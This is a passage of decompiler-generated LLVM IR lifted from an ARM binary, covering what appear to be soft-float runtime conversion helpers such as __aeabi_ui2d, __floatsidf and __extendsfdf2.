  %v5_1a3f4 = or i32 %v3_1a3f4, %v4_1a3f4
  store i32 %v5_1a3f4, i32* %r0.global-to-local, align 4
  %v9_1a3f4 = icmp ule i32 %v5_1a3f4, %v0_1a3f4
  %v10_1a3f4 = icmp ult i32 %v3_1a3f4, %v0_1a3f4
  %v11_1a3f4 = select i1 %v1_1a3f0, i1 %v9_1a3f4, i1 %v10_1a3f4
  %v3_1a3f8 = mul i32 %v0_1a3a8, 2
  %v4_1a3f8 = zext i1 %v11_1a3f4 to i32
  %v5_1a3f8 = or i32 %v4_1a3f8, %v3_1a3f8
  store i32 %v5_1a3f8, i32* %r1.global-to-local, align 4
  %v1_1a3fc = and i32 %v3_1a3f8, 1048576
  %v2_1a3fc = icmp eq i32 %v1_1a3fc, 0
  %v0_1a400 = load i32, i32* @r4, align 4
  %v1_1a400 = add i32 %v0_1a400, -1
  store i32 %v1_1a400, i32* @r4, align 4
  br i1 %v2_1a3fc, label %bb7, label %dec_label_pc_1a3d4

bb7:                                              ; preds = %dec_label_pc_1a3f0
  ret i32 %v5_1a3f4

; uselistorder directives
  uselistorder i32 %v0_1a3f4, { 1, 2, 0 }
  uselistorder i1 %v1_1a3f0, { 1, 0 }
  uselistorder i32 %v1_1a3d8, { 1, 0 }
  uselistorder i32 %v0_1a3d4, { 1, 0 }
  uselistorder i32 %v0_1a3c0, { 1, 0, 2 }
  uselistorder i32 %v0_1a3bc, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1a3d4._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1a3d4, { 0, 2, 1 }
}

define i32 @function_1a408() local_unnamed_addr {
dec_label_pc_1a408:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_1a408 = load i32, i32* @r1, align 4
  %v2_1a408 = icmp eq i32 %v0_1a408, 0
  br i1 %v2_1a408, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_1a408
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_1a408
  %v1_1a41410 = load i32, i32* @r0, align 4
  store i32 %v1_1a41410, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_1a470 = phi i32 [ %v0_1a408, %bb ], [ %v1_1a41410, %bb38 ]
  %v1_1a428 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_1a420 = icmp ugt i32 %v0_1a470, 65535
  br i1 %v2_1a420, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_1a424 = and i32 %v0_1a470, 32768
  %v3_1a424 = icmp eq i32 %v2_1a424, 0
  %v4_1a424 = udiv i32 %v0_1a470, 65536
  br i1 %v3_1a424, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_1a428 = add nsw i32 %v1_1a428, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_1a434 = phi i32 [ %v1_1a428, %.thread ], [ %v1_1a428, %bb39 ], [ %v2_1a428, %bb40 ]
  %v1_1a430 = phi i32 [ %v0_1a470, %.thread ], [ %v4_1a424, %bb39 ], [ %v4_1a424, %bb40 ]
  %v2_1a42c = icmp ugt i32 %v1_1a430, 255
  br i1 %v2_1a42c, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_1a430 = and i32 %v1_1a430, 128
  %v3_1a430 = icmp eq i32 %v2_1a430, 0
  %v4_1a430 = udiv i32 %v1_1a430, 256
  br i1 %v3_1a430, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_1a434 = add nsw i32 %v1_1a434, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_1a440 = phi i32 [ %v1_1a434, %.thread3 ], [ %v1_1a434, %bb41 ], [ %v2_1a434, %bb42 ]
  %v1_1a43c = phi i32 [ %v1_1a430, %.thread3 ], [ %v4_1a430, %bb41 ], [ %v4_1a430, %bb42 ]
  %v2_1a438 = icmp ugt i32 %v1_1a43c, 15
  br i1 %v2_1a438, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_1a43c = and i32 %v1_1a43c, 8
  %v3_1a43c = icmp eq i32 %v2_1a43c, 0
  %v4_1a43c = udiv i32 %v1_1a43c, 16
  br i1 %v3_1a43c, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_1a440 = add nsw i32 %v1_1a440, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_1a448 = phi i32 [ %v1_1a440, %.thread4 ], [ %v1_1a440, %bb43 ], [ %v2_1a440, %bb44 ]
  %v1_1a450 = phi i32 [ %v1_1a43c, %.thread4 ], [ %v4_1a43c, %bb43 ], [ %v4_1a43c, %bb44 ]
  %v2_1a444 = icmp ugt i32 %v1_1a450, 3
  br i1 %v2_1a444, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_1a448 = add i32 %v1_1a448, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_1a44c = udiv i32 %v1_1a450, 2
  %v6_1a44c = sub i32 %v1_1a448, %v5_1a44c
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_1a450 = phi i32 [ %v6_1a44c, %.thread6 ], [ %v2_1a448, %bb45 ]
  %v4_1a450 = udiv i32 %v1_1a450, 8
  %v5_1a450 = sub i32 %v0_1a450, %v4_1a450
  %v2_1a454 = add i32 %v5_1a450, -32
  %v4_1a454 = sub i32 31, %v5_1a450
  %v5_1a454 = and i32 %v4_1a454, %v5_1a450
  %v8_1a454 = icmp eq i32 %v5_1a450, 32
  %v6_1a458 = icmp slt i32 %v5_1a450, 32
  br i1 %v6_1a458, label %dec_label_pc_1a45c, label %dec_label_pc_1a47c

dec_label_pc_1a45c:                               ; preds = %bb46
  %v2_1a45c = add i32 %v5_1a450, -20
  %v7_1a460 = icmp sgt i32 %v2_1a454, -12
  br i1 %v7_1a460, label %dec_label_pc_1a464, label %dec_label_pc_1a478

dec_label_pc_1a464:                               ; preds = %dec_label_pc_1a45c
  %v1_1a468 = sub i32 32, %v5_1a450
  %v6_1a46c = shl i32 %v0_1a470, %v5_1a450
  store i32 %v6_1a46c, i32* @r0, align 4
  %v6_1a470 = lshr i32 %v0_1a470, %v1_1a468
  store i32 %v6_1a470, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_1a478:                               ; preds = %dec_label_pc_1a45c
  %v8_1a45c = icmp eq i32 %v2_1a45c, 0
  %v4_1a45c = add i32 %v5_1a450, 2147483616
  %v5_1a45c = and i32 %v2_1a45c, %v4_1a45c
  br label %dec_label_pc_1a47c

dec_label_pc_1a47c:                               ; preds = %bb46, %dec_label_pc_1a478
  %v1_1a488.in = phi i32 [ %v2_1a454, %bb46 ], [ %v2_1a45c, %dec_label_pc_1a478 ]
  %v6_1a488 = phi i32 [ %v2_1a454, %bb46 ], [ %v5_1a450, %dec_label_pc_1a478 ]
  %v2_1a488.in = phi i32 [ %v5_1a454, %bb46 ], [ %v5_1a45c, %dec_label_pc_1a478 ]
  %v0_1a488 = phi i1 [ %v8_1a454, %bb46 ], [ %v8_1a45c, %dec_label_pc_1a478 ]
  %v1_1a488 = icmp slt i32 %v1_1a488.in, 0
  %v2_1a488 = icmp slt i32 %v2_1a488.in, 0
  %v3_1a47c = xor i1 %v2_1a488, %v1_1a488
  %v4_1a47c = or i1 %v0_1a488, %v3_1a47c
  br i1 %v4_1a47c, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_1a47c
  %v6_1a47c = sub i32 32, %v6_1a488
  store i32 %v6_1a47c, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1a47c, %bb47
  %v6_1a480 = shl i32 %v0_1a470, %v6_1a488
  store i32 %v6_1a480, i32* %r1.global-to-local, align 4
  br i1 %v4_1a47c, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_1a484 = load i32, i32* @r0, align 4
  %v7_1a484 = load i32, i32* @ip, align 4
  %v12_1a484 = lshr i32 %v6_1a484, %v7_1a484
  %v13_1a484 = or i32 %v12_1a484, %v6_1a480
  store i32 %v13_1a484, i32* %r1.global-to-local, align 4
  %v11_1a488 = shl i32 %v6_1a484, %v6_1a488
  store i32 %v11_1a488, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_1a464, %bb49
  %v6_1a490 = phi i32 [ %v6_1a470, %dec_label_pc_1a464 ], [ %v13_1a484, %bb49 ], [ %v6_1a480, %bb48 ]
  %v0_1a48c = load i32, i32* @r4, align 4
  %v2_1a48c = sub i32 %v0_1a48c, %v5_1a450
  store i32 %v2_1a48c, i32* %r4.global-to-local, align 4
  %v4_1a48c = xor i32 %v0_1a48c, %v5_1a450
  %v5_1a48c = xor i32 %v2_1a48c, %v0_1a48c
  %v6_1a48c = and i32 %v5_1a48c, %v4_1a48c
  %v7_1a48c = icmp slt i32 %v6_1a48c, 0
  %v8_1a48c = icmp slt i32 %v2_1a48c, 0
  %v5_1a490 = icmp slt i32 %v0_1a48c, %v5_1a450
  br i1 %v5_1a490, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_1a490 = mul i32 %v2_1a48c, 1048576
  %v11_1a490 = add i32 %v10_1a490, %v6_1a490
  %v7_1a494 = load i32, i32* @r5, align 4
  %v8_1a494 = or i32 %v7_1a494, %v11_1a490
  store i32 %v8_1a494, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_1a49c = xor i1 %v8_1a48c, %v7_1a48c
  %v4_1a49c = xor i1 %v3_1a49c, true
  call void @__pseudo_cond_branch(i1 %v4_1a49c, i32 %tmp33)
  %v0_1a4a0 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a4a4 = sub i32 -32, %v0_1a4a0
  store i32 %v2_1a4a4, i32* %r4.global-to-local, align 4
  %v6_1a4a8 = icmp sgt i32 %v0_1a4a0, -32
  br i1 %v6_1a4a8, label %dec_label_pc_1a4ac, label %dec_label_pc_1a4ec

dec_label_pc_1a4ac:                               ; preds = %.thread8
  %v1_1a4ac = add i32 %v2_1a4a4, 12
  store i32 %v1_1a4ac, i32* %r4.global-to-local, align 4
  %v8_1a4b0 = icmp sgt i32 %v1_1a4ac, 0
  br i1 %v8_1a4b0, label %dec_label_pc_1a4d0, label %dec_label_pc_1a4b4

dec_label_pc_1a4b4:                               ; preds = %dec_label_pc_1a4ac
  %v1_1a4b4 = add i32 %v2_1a4a4, 32
  %v1_1a4b8 = sub i32 0, %v2_1a4a4
  %v0_1a4bc = load i32, i32* @r0, align 4
  %v6_1a4bc = lshr i32 %v0_1a4bc, %v1_1a4b4
  %v1_1a4c0 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a4c0 = shl i32 %v1_1a4c0, %v1_1a4b8
  %v8_1a4c0 = or i32 %v7_1a4c0, %v6_1a4bc
  %v0_1a4c4 = load i32, i32* @r5, align 4
  %v7_1a4c4 = lshr i32 %v1_1a4c0, %v1_1a4b4
  %v8_1a4c4 = or i32 %v0_1a4c4, %v7_1a4c4
  store i32 %v8_1a4c4, i32* %r1.global-to-local, align 4
  %v2_1a4c8 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1a4c8, i32* %r4.global-to-local, align 4
  ret i32 %v8_1a4c0

dec_label_pc_1a4d0:                               ; preds = %dec_label_pc_1a4ac
  %v1_1a4d0 = sub i32 0, %v2_1a4a4
  %v1_1a4d4 = add i32 %v2_1a4a4, 32
  %v0_1a4d8 = load i32, i32* @r0, align 4
  %v6_1a4d8 = lshr i32 %v0_1a4d8, %v1_1a4d4
  %v1_1a4dc = load i32, i32* %r1.global-to-local, align 4
  %v7_1a4dc = shl i32 %v1_1a4dc, %v1_1a4d0
  %v8_1a4dc = or i32 %v7_1a4dc, %v6_1a4d8
  %v0_1a4e0 = load i32, i32* @r5, align 4
  store i32 %v0_1a4e0, i32* %r1.global-to-local, align 4
  %v2_1a4e4 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1a4e4, i32* %r4.global-to-local, align 4
  ret i32 %v8_1a4dc

dec_label_pc_1a4ec:                               ; preds = %.thread8
  %v0_1a4ec = load i32, i32* %r1.global-to-local, align 4
  %v6_1a4ec = lshr i32 %v0_1a4ec, %v2_1a4a4
  %v0_1a4f0 = load i32, i32* @r5, align 4
  store i32 %v0_1a4f0, i32* %r1.global-to-local, align 4
  %v2_1a4f4 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1a4f4, i32* %r4.global-to-local, align 4
  ret i32 %v6_1a4ec

; uselistorder directives
  uselistorder i32 %v2_1a4a4, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_1a48c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a48c, { 2, 0, 1, 3 }
  uselistorder i32 %v6_1a480, { 1, 0, 2 }
  uselistorder i32 %v2_1a454, { 1, 0, 2 }
  uselistorder i32 %v5_1a450, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_1a43c, { 1, 0 }
  uselistorder i32 %v1_1a43c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a430, { 1, 0 }
  uselistorder i32 %v1_1a430, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a424, { 1, 0 }
  uselistorder i32 %v0_1a470, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 3, 1, 2, 4, 16, 17, 5, 19, 20, 6, 21, 22, 18, 15, 14, 13, 12, 11, 23, 24, 25, 26, 10, 7, 9, 8, 27, 28, 29, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 9, 10, 11, 2, 4, 5, 3, 12, 13, 14, 0, 6, 8, 7, 15, 21, 20, 22, 23, 24, 17, 16, 19, 18, 1 }
  uselistorder i32 -4, { 10, 0, 1, 53, 11, 49, 12, 20, 73, 74, 75, 6, 21, 22, 23, 76, 77, 78, 7, 24, 25, 26, 79, 80, 81, 8, 27, 28, 82, 19, 18, 83, 84, 85, 17, 16, 15, 14, 29, 30, 31, 32, 33, 5, 34, 3, 35, 4, 86, 13, 36, 45, 46, 47, 48, 37, 38, 61, 62, 63, 9, 64, 65, 66, 39, 60, 2, 40, 54, 55, 56, 57, 58, 59, 67, 68, 69, 70, 71, 72, 41, 50, 51, 52, 42, 43, 44 }
  uselistorder i32 15, { 8, 9, 3, 15, 10, 11, 12, 13, 0, 16, 1, 18, 17, 2, 14, 4, 5, 6, 7 }
  uselistorder i32 -8, { 11, 12, 1, 40, 19, 20, 21, 22, 23, 24, 18, 17, 10, 16, 15, 14, 13, 25, 26, 27, 28, 29, 9, 44, 45, 30, 31, 32, 33, 34, 43, 46, 35, 47, 39, 36, 37, 38, 2, 41, 42, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 128, { 13, 14, 8, 9, 6, 7, 10, 21, 20, 0, 1, 2, 11, 17, 18, 3, 4, 12, 19, 5, 16, 22, 15 }
  uselistorder i32 255, { 8, 9, 5, 12, 13, 4, 6, 7, 11, 0, 1, 2, 3, 14, 10 }
  uselistorder i32 -16, { 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22 }
  uselistorder i32 65536, { 1, 2, 3, 0, 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 29, 28, 30, 73, 72, 70, 74, 31, 32, 33, 34, 35, 36, 37, 71, 38, 40, 39, 41, 43, 42, 44, 45, 46, 47, 48, 50, 49, 51, 54, 53, 52, 55, 56, 57, 60, 59, 58, 61, 63, 64, 62, 65, 67, 68, 66, 69 }
  uselistorder i32 32768, { 3, 4, 2, 0, 1, 6, 5 }
  uselistorder i32 65535, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32 52, { 1, 17, 3, 20, 12, 13, 4, 18, 19, 24, 25, 2, 26, 0, 27, 28, 5, 6, 7, 9, 8, 10, 15, 22, 16, 14, 23, 11, 21 }
  uselistorder i32 20, { 5, 41, 42, 2, 8, 47, 0, 30, 43, 44, 16, 17, 18, 19, 40, 51, 9, 52, 53, 3, 54, 48, 10, 31, 32, 37, 38, 39, 20, 11, 21, 22, 1, 55, 6, 12, 56, 45, 46, 4, 7, 33, 34, 35, 36, 23, 49, 24, 25, 26, 27, 28, 29, 15, 13, 50, 14 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1a47c, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1a4fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1a4fc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1a4fc = load i32, i32* @r4, align 4
  %v2_1a4fc = icmp eq i32 %v0_1a4fc, 0
  %v1_1a500 = xor i32 %arg3, 1048576
  store i32 %v1_1a500, i32* @r3, align 4
  br i1 %v2_1a4fc, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1a4fc
  %v1_1a504 = load i32, i32* @r1, align 4
  %v2_1a504 = xor i32 %v1_1a504, 1048576
  store i32 %v2_1a504, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1a4fc
  %v1_1a50c = load i32, i32* @r5, align 4
  %v2_1a50c = add i32 %v1_1a50c, -1
  store i32 %v2_1a50c, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1a510 = call i32 @function_1a354()
  store i32 %v0_1a510, i32* %r0.global-to-local, align 4
  %v0_1a514 = load i32, i32* @r4, align 4
  %v0_1a514.off = add i32 %v0_1a514, 4194303
  %tmp = icmp ult i32 %v0_1a514.off, 2097152
  %v1_1a5a4 = load i32, i32* @r5, align 4
  %v1_1a5a4.off = add i32 %v1_1a5a4, 4194303
  %tmp44 = icmp ult i32 %v1_1a5a4.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_1a520

dec_label_pc_1a520:                               ; preds = %bb30
  %v4_1a520 = icmp eq i32 %v1_1a5a4, %v0_1a514
  br i1 %v4_1a520, label %bb31, label %dec_label_pc_1a52c

bb31:                                             ; preds = %dec_label_pc_1a520
  %v2_1a524 = load i32, i32* @r2, align 4
  %v5_1a524 = icmp eq i32 %v2_1a524, %v0_1a510
  br i1 %v5_1a524, label %dec_label_pc_1a540, label %dec_label_pc_1a52c

dec_label_pc_1a52c:                               ; preds = %dec_label_pc_1a520, %bb31
  %v2_1a52c = or i32 %v0_1a514, %v0_1a510
  %v4_1a52c = icmp eq i32 %v2_1a52c, 0
  br i1 %v4_1a52c, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1a52c
  %v1_1a534 = load i32, i32* @r2, align 4
  store i32 %v1_1a534, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1a52c, %bb32
  %v1_1a53c = phi i32 [ %v0_1a510, %dec_label_pc_1a52c ], [ %v1_1a534, %bb32 ]
  ret i32 %v1_1a53c

dec_label_pc_1a540:                               ; preds = %bb31
  %v0_1a540 = load i32, i32* @r1, align 4
  %v1_1a540 = load i32, i32* @r3, align 4
  %v4_1a540 = icmp eq i32 %v1_1a540, %v0_1a540
  br i1 %v4_1a540, label %dec_label_pc_1a540..thread8_crit_edge, label %bb33

dec_label_pc_1a540..thread8_crit_edge:            ; preds = %dec_label_pc_1a540
  %v0_1a550.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_1a540
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1a540..thread8_crit_edge, %bb33
  %v0_1a550 = phi i32 [ %v0_1a550.pre, %dec_label_pc_1a540..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_1a550 = xor i1 %v4_1a540, true
  call void @__pseudo_cond_branch(i1 %v2_1a550, i32 %v0_1a550)
  %v0_1a554 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_1a554, 2097152
  br i1 %tmp45, label %dec_label_pc_1a55c, label %dec_label_pc_1a570

dec_label_pc_1a55c:                               ; preds = %.thread8
  %v0_1a55c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a55c = icmp slt i32 %v0_1a55c, 0
  %v2_1a55c = mul i32 %v0_1a55c, 2
  store i32 %v2_1a55c, i32* %r0.global-to-local, align 4
  %v0_1a560 = load i32, i32* @r1, align 4
  %v3_1a560 = mul i32 %v0_1a560, 2
  %v4_1a560 = zext i1 %v1_1a55c to i32
  %v5_1a560 = or i32 %v3_1a560, %v4_1a560
  %v9_1a560 = icmp ule i32 %v5_1a560, %v0_1a560
  %v10_1a560 = icmp ult i32 %v3_1a560, %v0_1a560
  %v11_1a560 = select i1 %v1_1a55c, i1 %v9_1a560, i1 %v10_1a560
  br i1 %v11_1a560, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_1a55c
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_1a55c, %bb34
  ret i32 %v2_1a55c

dec_label_pc_1a570:                               ; preds = %.thread8
  %v2_1a570 = icmp ugt i32 %v0_1a554, -4194305
  br i1 %v2_1a570, label %dec_label_pc_1a570..thread9_crit_edge, label %bb36

dec_label_pc_1a570..thread9_crit_edge:            ; preds = %dec_label_pc_1a570
  %v0_1a57c.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_1a570
  %v1_1a574 = load i32, i32* @r1, align 4
  %v2_1a574 = add i32 %v1_1a574, 1048576
  store i32 %v2_1a574, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1a570..thread9_crit_edge, %bb36
  %v0_1a57c = phi i32 [ %v0_1a57c.pre, %dec_label_pc_1a570..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_1a57c = xor i1 %v2_1a570, true
  call void @__pseudo_cond_branch(i1 %v2_1a57c, i32 %v0_1a57c)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_1a5b0.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_1a5b0.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_1a59c = load i32, i32* @r3, align 4
  %v1_1a5a0 = load i32, i32* @r2, align 4
  store i32 %v1_1a5a0, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1a5b023 = phi i32 [ %v1_1a5b0.pre, %.thread14 ], [ %v1_1a59c, %bb37 ]
  %v1_1a5ac = phi i32 [ %v0_1a510, %.thread14 ], [ %v1_1a5a0, %bb37 ]
  store i32 %v1_1a5ac, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_1a5bc = phi i32 [ %v1_1a5b023, %bb38 ], [ %v1_1a5b0.pre, %.thread11 ]
  %v1_1a5c4 = phi i32 [ %v1_1a5ac, %bb38 ], [ %v0_1a510, %.thread11 ]
  %v4_1a5b0 = mul i32 %v1_1a5bc, 4096
  %v5_1a5b0 = or i32 %v4_1a5b0, %v1_1a5c4
  %v7_1a5b0 = icmp eq i32 %v5_1a5b0, 0
  br i1 %v7_1a5b0, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_1a5b4 = load i32, i32* @r2, align 4
  %v2_1a5b4 = load i32, i32* @r3, align 4
  %v5_1a5b4 = mul i32 %v2_1a5b4, 4096
  %v6_1a5b4 = or i32 %v5_1a5b4, %v1_1a5b4
  %v8_1a5b4 = icmp eq i32 %v6_1a5b4, 0
  br i1 %v8_1a5b4, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_1a5b8 = icmp eq i32 %v2_1a5b4, %v1_1a5bc
  br i1 %v5_1a5b8, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_1a5c4

; uselistorder directives
  uselistorder i32 %v1_1a5b0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1a560, { 1, 2, 0 }
  uselistorder i32 %v2_1a55c, { 1, 0 }
  uselistorder i1 %v1_1a55c, { 1, 0 }
  uselistorder i32 %v0_1a554, { 1, 0 }
  uselistorder i1 %v4_1a540, { 1, 0 }
  uselistorder i32 %v0_1a514, { 2, 0, 1 }
  uselistorder i32 %v0_1a510, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1a52c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1a5c8 = icmp eq i32 %arg1, 0
  br i1 %v2_1a5c8, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1a5d0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1a5c8, i32 %v0_1a5d0)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_1a5e8 = call i32 @function_1a408()
  ret i32 %v0_1a5e8

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1a5ec = icmp eq i32 %arg1, 0
  br i1 %v2_1a5ec, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1a5f4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1a5ec, i32 %v0_1a5f4)
  store i32 1074, i32* @r4, align 4
  %v1_1a604 = and i32 %arg1, -2147483648
  store i32 %v1_1a604, i32* @r5, align 4
  %v2_1a604 = icmp eq i32 %v1_1a604, 0
  br i1 %v2_1a604, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1a608 = sub i32 0, %arg1
  store i32 %v2_1a608, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_1a610 = call i32 @function_1a408()
  ret i32 %v0_1a610

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_1a614 = mul i32 %arg1, 2
  store i32 %v2_1a614, i32* %r2.global-to-local, align 4
  %v4_1a614 = icmp eq i32 %v2_1a614, 0
  %v1_1a618 = and i32 %v2_1a614, 4
  %v2_1a618 = icmp ne i32 %v1_1a618, 0
  %v3_1a618 = sdiv i32 %v2_1a614, 8
  %v3_1a61c = zext i1 %v2_1a618 to i32
  %v6_1a61c = zext i32 %v3_1a618 to i64
  %v7_1a61c = sub nsw i32 33, %v3_1a618
  %v8_1a61c = zext i32 %v7_1a61c to i64
  %v9_1a61c = shl i64 %v6_1a61c, %v8_1a61c
  %v10_1a61c = sub nsw i32 32, %v3_1a618
  %v11_1a61c = shl i32 %v3_1a61c, %v10_1a61c
  %v12_1a61c = zext i32 %v11_1a61c to i64
  %v14_1a61c = or i64 %v12_1a61c, %v9_1a61c
  %v15_1a61c = trunc i64 %v14_1a61c to i32
  store i32 %v15_1a61c, i32* %r1.global-to-local, align 4
  %v3_1a620 = mul i32 %arg1, 536870912
  store i32 %v3_1a620, i32* @r0, align 4
  br i1 %v4_1a614, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1a624 = and i32 %v2_1a614, -16777216
  store i32 %v2_1a624, i32* @r3, align 4
  %v4_1a624 = icmp eq i32 %v2_1a624, 0
  br i1 %v4_1a624, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_1a628 = icmp ugt i32 %v2_1a614, -16777217
  br i1 %v4_1a628, label %.thread1, label %bb8

